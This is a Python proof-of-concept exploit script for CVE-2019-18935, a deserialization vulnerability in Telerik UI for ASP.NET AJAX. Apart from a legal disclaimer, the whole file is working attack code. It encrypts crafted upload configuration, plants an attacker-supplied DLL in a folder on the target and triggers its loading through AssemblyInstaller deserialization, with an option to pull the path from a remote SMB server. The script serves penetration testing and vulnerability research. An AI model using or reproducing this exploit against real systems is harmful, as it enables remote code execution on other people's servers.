#!/usr/bin/env python3

'''
Author:     @noperator
Purpose:    Proof-of-concept exploit for CVE-2019-18935, a .NET JSON
            deserialization vulnerability in Telerik UI for ASP.NET AJAX
            allowing remote code execution.
Notes:      - This tool's dependencies are best satisfied when those modules
              are installed within a virtual environment.
            - You'll need Visual Studio installed to compile mixed-mode .NET
              assembly DLL payloads using build_dll.bat.
            - Usage of this tool for attacking targets without prior mutual
              consent is illegal. It is the end user's responsibility to obey
              all applicable local, state, and federal laws. Developers assume
              no liability and are not responsible for any misuse or damage
              caused by this program.
Usage:      python3 CVE-2019-18935.py -h
'''

from argparse import ArgumentParser
from json import dumps, loads
from os.path import basename, splitext
from pprint import pprint
from sys import stderr, path
from time import time

from requests import post
from requests.packages.urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

# Import encryption routines.
path.insert(1, 'RAU_crypto')
from RAU_crypto import RAUCipher

disable_warnings(category=InsecureRequestWarning)

def send_request(url, files):
    headers = {
        'User-Agent':                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
        'Connection':                'close',
        'Accept-Language':           'en-US,en;q=0.5',
        'Accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
    }
    response = post(url, files=files, headers=headers, verify=False)
    try:
        result = loads(response.text)
        result['metaData'] = loads(RAUCipher.decrypt(result['metaData']))
        pprint(result)
        return result
    except:
        print(response.text)

def build_raupostdata(object_, type_):
    return RAUCipher.encrypt(dumps(object_)) + '&' + RAUCipher.encrypt(type_)

def upload(ui_version, temp_target_folder, filename_local, filename_remote, url):

    # Build rauPostData. The TimeToLive values seem a bit arbitrary, but when
    # they're all set to 0, the payload disappears shortly after being written
    # to disk.
    object_ = {
        'TargetFolder':     RAUCipher.addHmac(RAUCipher.encrypt(''),                                    ui_version),
        'TempTargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(temp_target_folder.replace('/', '\\')), ui_version),
        'MaxFileSize': 0,
        'TimeToLive': {
            'Ticks':             1440000000000,
            'Days':              0,
            'Hours':             40,
            'Minutes':           0,
            'Seconds':           0,
            'Milliseconds':      0,
            'TotalDays':         1.6666666666666666,
            'TotalHours':        40,
            'TotalMinutes':      2400,
            'TotalSeconds':      144000,
            'TotalMilliseconds': 144000000,
        },
        'UseApplicationPoolImpersonation': False,
    }

    type_ = ', '.join([
        'Telerik.Web.UI.AsyncUploadConfiguration',
        'Telerik.Web.UI',
        'Version={}'.format(ui_version),
        'Culture=neutral',
        'PublicKeyToken=121fae78165ba3d4',
    ])

    raupostdata = build_raupostdata(object_, type_)

    with open(filename_local, 'rb') as f:
        payload = f.read()

    # The UploadID determines the remote filename on disk.
    metadata = {
        'TotalChunks':   1,
        'ChunkIndex':    0,
        'TotalFileSize': 1,
        'UploadID':      filename_remote,
    }

    # Build multipart form data.
    files = {
        'rauPostData':      (None, raupostdata),
        'file':             (filename_remote, payload, 'application/octet-stream'),
        'fileName':         (None, filename_remote),
        'contentType':      (None, 'application/octet-stream'),
        'lastModifiedDate': (None, '1970-01-01T00:00:00.000Z'),
        'metadata':         (None, dumps(metadata)),
    }

    # Send request.
    print('[*] Local payload name: ', filename_local,     file=stderr)
    print('[*] Destination folder: ', temp_target_folder, file=stderr)
    print('[*] Remote payload name:', filename_remote,    file=stderr)
    print(file=stderr)
    result = send_request(url, files)

    # Check for unexpected, additional renaming of payload.
    if filename_remote != result['metaData']['TempFileName']:
        print(
            '\n[*] Heads up!',
             'Payload was renamed on target from "{}" to "{}".'.format(
                filename_remote,
                result['metaData']['TempFileName']),
            'Will adjust automatically while deserializing; otherwise, if',
            'deserializing manually with the "-d" option, use the "-r" option',
            'to specify the accurate, renamed payload on target.',
            file=stderr
        )

    return result['metaData']['TempFileName']

def deserialize(net_version, temp_target_folder, filename_remote, url, smb_server=None):

    if smb_server:
        path = '\\\\{}\\{}\\test.txt'.format(smb_server, str(int(time())))
    else:
        path = 'file:///{}/{}'.format(temp_target_folder.replace('\\', '/'), filename_remote)

    # Build rauPostData.
    object_ = {'Path': path}
    type_ = ', '.join([
        'System.Configuration.Install.AssemblyInstaller',
        'System.Configuration.Install',
        'Version={}'.format(net_version),
        'Culture=neutral',
        'PublicKeyToken=b03f5f7f11d50a3a',
    ])
    raupostdata = build_raupostdata(object_, type_)

    # Build multipart form data. The extra blank input is required for the page
    # to process the request.
    files = {
        'rauPostData': (None, raupostdata),
        '':            '',
    }

    # Send request.
    print('\n[*] Triggering deserialization for .NET v' + net_version + '...\n', file=stderr)
    start = time()
    send_request(url, files)
    end = time()
    print('\n[*] Response time:', round(end - start, 2), 'seconds', file=stderr)

if __name__ == '__main__':
    parser = ArgumentParser(description='Exploit for CVE-2019-18935, a .NET JSON deserialization vulnerability in Telerik UI for ASP.NET AJAX.')
    parser.add_argument('-t', dest='upload_only', action='store_true', help='just upload a file')
    parser.add_argument('-d', dest='deserialize_only', action='store_true', help='just deserialize')
    parser.add_argument('-r', dest='filename_remote', help='remote payload name, for optional use with -d')
    parser.add_argument('-s', dest='smb_server', help='remote SMB server, for optional use with -d')
    parser.add_argument('-v', dest='ui_version', help='software version')
    parser.add_argument('-n', dest='net_version', default='4.0.0.0', help='.NET version')
    parser.add_argument('-p', dest='payload', help='mixed mode assembly DLL')
    parser.add_argument('-f', dest='folder', default='C:\Windows\Temp', help='destination folder on target')
    parser.add_argument('-u', dest='url', required=True, help='https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau')
    args = parser.parse_args()

    # argparse doesn't handle interdependent arguments well, so we have to do
    # that here, unfortunately.

    # If only deserializing, then must provide a remote payload name OR an SMB
    # server.
    if args.deserialize_only:
        if args.filename_remote:
            filename_remote_actual = args.filename_remote
        elif not args.smb_server:
            parser.error('Deserializing requires -r OR -s.')

    # Not "deserializing only" implies an upload.
    else:
        if args.filename_remote or args.smb_server:
            parser.error('Uploading cannot be used with -r or -s.')

        # Uploading always requires a UI version, payload, and folder.
        if (args.ui_version is None or
            args.payload    is None or
            args.folder     is None):
            parser.error('Uploading requires -v, -p, and -f.')

        filename_remote_actual = upload(
            args.ui_version,
            args.folder,
            args.payload,
            str(time()) + splitext(basename(args.payload))[1],
            args.url
        )

    # Not "uploading only" implies deserialization.
    if not args.upload_only:
        if args.smb_server:
            temp_target_folder = str(int(time()))
            filename_remote_actual = 'smb_test.txt'
        else:
            temp_target_folder = args.folder

        deserialize(
            args.net_version,
            temp_target_folder,
            filename_remote_actual,
            args.url,
            smb_server=args.smb_server
        )
